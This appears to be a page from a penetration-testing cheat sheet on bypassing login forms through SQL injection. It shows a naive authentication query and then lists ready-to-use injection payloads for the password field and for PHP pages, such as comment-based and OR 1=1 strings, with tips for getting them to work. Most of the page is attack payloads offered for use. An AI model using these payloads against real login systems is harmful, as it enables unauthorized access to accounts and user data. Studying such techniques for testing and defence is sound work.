# Authentication Bypass

This method consists of considering that the web application isn't interested in the content of the username and password, but in making a matching pair in the users' table.

* We assume the database uses a basic query for authentication

{% code overflow="wrap" lineNumbers="true" %}
```sql
SELECT * from users WHERE username='%user%' and password='%password%' LIMIT 1;
```
{% endcode %}

{% hint style="info" %}
_%user%_ and _%password%_ are the values received on a login form
{% endhint %}

***

* We can do a malicious insertion on the password field

{% code overflow="wrap" lineNumbers="true" %}
```sql
'--   #Use this comparison to cheat on verification
' OR 1=1;--   #Another alternative
'+OR+1=1-- #Another alternative
#This will skip the password verification and enumerate all the users
```
{% endcode %}

{% hint style="info" %}
Sometimes, an extra space after `;--` could make it work
{% endhint %}

***

* On PHP-based pages, we can replicate the same with a different payload

{% code overflow="wrap" lineNumbers="true" %}
```java
admin'#      //Insert this to skip the password verification
```
{% endcode %}
